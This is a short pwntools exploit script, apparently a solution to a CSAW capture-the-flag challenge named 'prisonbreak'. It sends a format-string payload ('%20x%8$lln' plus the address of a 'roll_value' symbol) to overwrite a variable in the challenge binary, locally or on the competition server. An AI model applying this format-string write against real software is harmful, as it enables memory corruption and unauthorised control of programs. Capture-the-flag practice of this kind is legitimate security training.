from pwn import *

e = ELF("./prisonbreak")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.red.csaw.io", 5004)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


debug()

p.sendlineafter(">", "%20x%8$lln".ljust(0x10, "\x00") + p64(e.symbols["roll_value"]))


p.interactive()
